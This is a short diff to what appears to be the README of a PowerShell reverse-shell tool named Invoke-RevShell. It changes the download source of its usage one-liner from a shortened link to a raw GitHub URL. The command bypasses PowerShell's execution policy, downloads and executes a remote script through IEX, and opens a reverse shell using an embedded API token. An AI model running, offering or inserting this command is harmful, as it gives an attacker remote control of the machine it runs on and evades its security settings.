@@ -32,7 +32,7 @@ C:\PS> Invoke-RevShell -api 29yvUB6uwEHpE8lhStj4qIdwZ2e_7Tq9NtyNJJ6vcpYPq6mhJ
 
 ```powershell
 C:\PS> powershell -ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol=Net.SecurityProtocolType]::Tls12;
-                                  IEX(New-Object Net.WebClient).downloadString('https://bit.ly/3N8EZjb'); 
+                                  IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/halitAKAYDIN/Ps-Revshell/main/Invoke-RevShell.ps1'); 
                                   Invoke-RevShell -api 29yvUB6uwEHpE8lhStj4qIdwZ2e_7Tq9NtyNJJ6vcpYPq6mhJ;"
 ```
 
